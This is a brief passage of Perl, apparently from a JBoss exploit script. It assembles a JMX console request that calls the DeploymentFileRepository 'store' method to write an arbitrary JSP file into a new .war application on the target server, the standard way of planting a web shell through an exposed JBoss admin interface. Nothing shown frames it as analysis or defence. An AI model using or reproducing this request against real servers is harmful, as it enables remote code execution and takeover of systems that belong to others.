...
$params = "action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=". uri_escape($appbase) . ".war"
		 ."&argType=java.lang.String&&arg1=" . $jspname . "&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" . uri_escape($jsp) . "&argType=boolean&arg4=True";
